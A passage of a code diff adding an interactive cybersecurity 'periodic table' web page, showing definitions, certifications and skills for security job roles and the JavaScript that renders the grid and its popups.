+                skills: 'Windows/Linux administration, Active Directory, scripting (PowerShell, Bash), networking, virtualization, backup solutions'
+            },
+            'FN': {
+                name: 'Firewall Administrator',
+                category: 'role',
+                categoryName: 'Security Role',
+                definition: 'Specialist responsible for managing, configuring, and maintaining network firewalls to protect organization\'s network perimeter and internal segments.',
+                examples: [
+                    'Rule management: Creating and maintaining firewall policies',
+                    'Change management: Implementing approved firewall changes',
+                    'Log analysis: Reviewing firewall logs for threats',
+                    'Troubleshooting: Resolving connectivity issues',
+                    'HA configuration: Setting up redundant firewall pairs'
+                ],
+                certifications: 'NSE (Fortinet), PCNSE (Palo Alto), Cisco Firepower',
+                skills: 'Firewall platforms (Palo Alto, Fortinet, Cisco), networking, VPN configuration, policy management, log analysis'
+            },
+            'SC': {
+                name: 'Security Consultant',
+                category: 'role',
+                categoryName: 'Security Role',
+                definition: 'External or internal advisor who assesses security posture, provides recommendations, and helps implement security solutions for organizations.',
+                examples: [
+                    'Risk assessments: Evaluating organizational security risks',
+                    'Compliance audits: PCI-DSS, HIPAA, SOC 2 assessments',
+                    'Architecture review: Evaluating security design',
+                    'Strategy development: Creating security roadmaps',
+                    'Implementation: Deploying security solutions'
+                ],
+                certifications: 'CISSP, CISM, CRISC, various technical certifications',
+                skills: 'Security frameworks, risk management, compliance, communication, project management, technical security knowledge'
+            },
+            'FI': {
+                name: 'Forensic Investigator',
+                category: 'role',
+                categoryName: 'Security Role',
+                definition: 'Specialist who collects, preserves, and analyzes digital evidence from computers, networks, and storage devices to support legal proceedings or incident investigations.',
+                examples: [
+                    'Disk forensics: Analyzing hard drives for evidence',
+                    'Memory forensics: Examining RAM for malware and artifacts',
+                    'Network forensics: Analyzing packet captures',
+                    'Mobile forensics: Extracting data from smartphones',
+                    'Chain of custody: Maintaining evidence integrity'
+                ],
+                certifications: 'GCFE, GCFA, EnCE, CCE, CCFP',
+                skills: 'EnCase, FTK, Autopsy, memory analysis (Volatility), legal procedures, report writing, evidence handling'
+            },
+            'DO': {
+                name: 'DevSecOps Engineer',
+                category: 'role',
+                categoryName: 'Security Role',
+                definition: 'Professional who integrates security practices into DevOps processes, ensuring security is built into applications and infrastructure from the beginning.',
+                examples: [
+                    'Security automation: Integrating security into CI/CD pipelines',
+                    'SAST/DAST: Implementing static and dynamic code analysis',
+                    'Container security: Scanning Docker images for vulnerabilities',
+                    'IaC security: Securing Terraform, CloudFormation templates',
+                    'Security as code: Writing security tests and policies'
+                ],
+                certifications: 'GWAPT, AWS Security Specialty, Certified DevSecOps Professional',
+                skills: 'CI/CD pipelines, container security, cloud platforms, scripting, security testing tools, Kubernetes, IaC'
+            },
+            'IM': {
+                name: 'IAM Specialist',
+                category: 'role',
+                categoryName: 'Security Role',
+                definition: 'Identity and Access Management expert who manages user identities, authentication, authorization, and ensures proper access controls across the organization.',
+                examples: [
+                    'Access management: Provisioning and deprovisioning users',
+                    'SSO implementation: Single sign-on across applications',
+                    'MFA deployment: Rolling out multi-factor authentication',
+                    'Privileged access: Managing admin accounts and PAM solutions',
+                    'Federation: Configuring SAML, OAuth, OIDC'
+                ],
+                certifications: 'CISSP, Certified Identity Management Professional',
+                skills: 'Active Directory, Azure AD, Okta, Ping Identity, SAML, OAuth, LDAP, access governance, PAM solutions'
+            },
+            'NE': {
+                name: 'Network Engineer',
+                category: 'role',
+                categoryName: 'Security Role',
+                definition: 'IT professional who designs, implements, and maintains network infrastructure with security considerations for connectivity, availability, and protection.',
+                examples: [
+                    'Network design: Architecting secure network topologies',
+                    'Router/switch configuration: Setting up network devices',
+                    'Network segmentation: Implementing VLANs and firewall zones',
+                    'VPN setup: Configuring site-to-site and remote access VPNs',
+                    'Troubleshooting: Resolving connectivity and performance issues'
+                ],
+                certifications: 'CCNA, CCNP Security, Network+, JNCIA',
+                skills: 'Routing and switching, TCP/IP, VLANs, VPNs, firewalls, network monitoring, Cisco/Juniper equipment'
+            },
+            'SM': {
+                name: 'SIEM Engineer',
+                category: 'role',
+                categoryName: 'Security Role',
+                definition: 'Specialist who designs, implements, and maintains Security Information and Event Management systems for log collection, correlation, and security monitoring.',
+                examples: [
+                    'SIEM deployment: Installing and configuring SIEM platforms',
+                    'Log source integration: Connecting systems to SIEM',
+                    'Correlation rules: Creating detection rules and use cases',
+                    'Dashboard creation: Building security visualization',
+                    'Tuning: Reducing false positives and improving detection'
+                ],
+                certifications: 'Splunk Certified Admin, QRadar Admin, GCIA',
+                skills: 'SIEM platforms (Splunk, QRadar, ArcSight), log parsing, regular expressions, correlation rules, scripting, security operations'
+            },
+            'GT': {
+                name: 'GRC Analyst',
+                category: 'role',
+                categoryName: 'Security Role',
+                definition: 'Governance, Risk and Compliance professional who ensures organization meets security standards, manages risks, and maintains regulatory compliance.',
+                examples: [
+                    'Risk assessments: Identifying and evaluating security risks',
+                    'Compliance audits: SOC 2, ISO 27001, PCI-DSS audits',
+                    'Policy management: Creating and maintaining security policies',
+                    'Vendor risk: Assessing third-party security',
+                    'Audit coordination: Managing external audit processes'
+                ],
+                certifications: 'CISSP, CISM, CRISC, CGRC, ISO 27001 Lead Auditor',
+                skills: 'Risk management frameworks, compliance standards, audit procedures, policy writing, vendor assessment, GRC tools'
+            },
+            'Rm': {
+                name: 'Risk Manager',
+                category: 'role',
+                categoryName: 'Security Role',
+                definition: 'Professional who identifies, assesses, and prioritizes security risks, developing strategies to mitigate, transfer, or accept risks based on business impact.',
+                examples: [
+                    'Risk identification: Finding potential security threats',
+                    'Risk analysis: Qualitative and quantitative risk assessment',
+                    'Risk treatment: Developing mitigation strategies',
+                    'Risk reporting: Communicating risks to leadership',
+                    'Risk monitoring: Tracking risk metrics and KRIs'
+                ],
+                certifications: 'CRISC, CISSP, CISM, ISO 31000',
+                skills: 'Risk assessment methodologies, threat modeling, business impact analysis, risk frameworks, communication, metrics'
+            },
+            'CL': {
+                name: 'Cloud Security Engineer',
+                category: 'role',
+                categoryName: 'Security Role',
+                definition: 'Specialist who secures cloud environments, implementing security controls, monitoring for threats, and ensuring compliance in AWS, Azure, or GCP platforms.',
+                examples: [
+                    'IAM configuration: Setting up cloud identity and access',
+                    'Network security: Configuring security groups, NACLs',
+                    'Encryption: Implementing data protection in cloud',
+                    'Compliance: Ensuring cloud resources meet standards',
+                    'CSPM: Cloud Security Posture Management tools'
+                ],
+                certifications: 'AWS Security Specialty, Azure Security Engineer, Google Cloud Security',
+                skills: 'Cloud platforms (AWS/Azure/GCP), IaC (Terraform), container security, cloud-native security tools, compliance frameworks'
+            },
+            'CO': {
+                name: 'CISO',
+                category: 'role',
+                categoryName: 'Security Role',
+                definition: 'Chief Information Security Officer - Executive responsible for establishing and maintaining enterprise security vision, strategy, and program to protect information assets.',
+                examples: [
+                    'Strategy development: Creating security roadmap aligned with business',
+                    'Budget management: Allocating security spending effectively',
+                    'Risk management: Overseeing enterprise risk program',
+                    'Board reporting: Communicating security posture to executives',
+                    'Team leadership: Building and managing security teams'
+                ],
+                certifications: 'CISSP, CISM, CGEIT, CRISC',
+                skills: 'Leadership, strategic planning, risk management, budget management, communication, security frameworks, business acumen'
+            }
+        };
+        
+        // Function to create element HTML
+        function createElement(symbol, data) {
+            if (!data) {
+                return '<div class="element empty"></div>';
+            }
+            
+            return `
+                <div class="element ${data.category}" onclick="showPopup('${symbol}')">
+                    <div class="element-symbol">${symbol}</div>
+                    <div class="element-name">${data.name}</div>
+                </div>
+            `;
+        }
+        
+        // Periodic table layout - 16 columns total
+        const tableLayout = [
+            ['PH', null, null, null, null, null, null, null, null, null, null, 'SB', 'EP', 'FL', null, null],
+            ['MW', null, null, null, null, null, null, null, null, null, 'ME', 'IS', 'OW', 'TI', 'SE', 'VP'],
+            ['RW', 'CS', 'DD', null, null, null, null, null, null, null, 'NC', 'CT', 'PS', 'VA', 'AC', 'Ed'],
+            ['SW', 'US', 'OP', 'BA', 'PE', 'CJ', 'NM', 'BS', 'JR', 'MZ', 'ST', 'S2', 'HP', 'SU', 'RA', 'SM'],
+            ['AD', 'MF', 'DE', 'XS', 'HR', 'RC', 'WS', 'NK', 'HC', 'SQ', 'KX', 'GD', 'ZT', 'PM', 'IR', 'MA'],
+            ['TN', 'ID', 'WA', 'DT', 'BO', 'XM', 'MS', 'HD', 'AG', 'GR', 'TD', 'CC', 'KC', 'AR', 'SP', 'DL'],
+            ['RK', 'SI', 'BF', null, null, null, null, null, null, null, null, null, null, null, null, null],
+            ['KL', null, null, null, null, null, null, null, null, null, null, null, null, null, null, null]
+        ];
+        
+        const rolesLayout = [
+            // Row 1: Empty spaces (cols 1-7), then 9 roles ending at col 16
+            null, null, null, null, null, null, null, 'PT', 'SA', 'SO', 'TH', 'RT', 'BT', 'SY', 'FN', 'SC',
+            // Row 2: Empty spaces (cols 1-7), then 9 roles ending at col 16
+            null, null, null, null, null, null, null, 'FI', 'DO', 'IM', 'NE', 'SM', 'GT', 'Rm', 'CL', 'CO'
+        ];
+        
+        // Generate periodic table
+        const periodicTable = document.getElementById('periodicTable');
+        tableLayout.forEach(row => {
+            row.forEach(symbol => {
+                periodicTable.innerHTML += createElement(symbol, elements[symbol]);
+            });
+        });
+        
+        // Generate roles section
+        const rolesSection = document.getElementById('rolesSection');
+        rolesLayout.forEach(symbol => {
+            rolesSection.innerHTML += createElement(symbol, elements[symbol]);
+        });
+        
+        // Popup functionality
+        function showPopup(symbol) {
+            const data = elements[symbol];
+            if (!data) return;
+            
+            const popup = document.getElementById('popup');
+            const overlay = document.getElementById('popupOverlay');
+            const icon = document.getElementById('popupIcon');
+            const title = document.getElementById('popupTitle');
+            const category = document.getElementById('popupCategory');
+            const content = document.getElementById('popupContent');
+            
+            // Set icon and category
+            icon.className = `popup-icon ${data.category}`;
+            icon.textContent = symbol;
+            title.textContent = data.name;
+            category.textContent = data.categoryName;
+            
+            // Build content
+            let contentHTML = `<p>${data.definition}</p>`;
+            
+            if (data.examples) {
+                contentHTML += '<h3>Examples & Use Cases</h3><ul>';
+                data.examples.forEach(example => {
+                    contentHTML += `<li>${example}</li>`;
+                });
+                contentHTML += '</ul>';
+            }
+            
+            if (data.prevention) {
+                contentHTML += `<h3>Prevention & Mitigation</h3><p>${data.prevention}</p>`;
+            }
+            
+            if (data.usage) {
+                contentHTML += `<h3>Common Usage</h3><p>${data.usage}</p>`;
+            }
+            
+            if (data.certifications) {
+                contentHTML += `<h3>Relevant Certifications</h3><p>${data.certifications}</p>`;
+            }
+            
+            if (data.skills) {
+                contentHTML += `<h3>Key Skills</h3><p>${data.skills}</p>`;
+            }
+            
+            content.innerHTML = contentHTML;
+            
+            // Show popup
+            popup.classList.add('active');
+            overlay.classList.add('active');
+        }
+        
+        function closePopup() {
+            document.getElementById('popup').classList.remove('active');
+            document.getElementById('popupOverlay').classList.remove('active');
+        }
+        
+        // Event listeners
+        document.getElementById('popupClose').addEventListener('click', closePopup);
+        document.getElementById('popupOverlay').addEventListener('click', closePopup);
+        
+        // ESC key to close
+        document.addEventListener('keydown', (e) => {
+            if (e.key === 'Escape') closePopup();
+        });
+    </script>
+</body>
+</html>
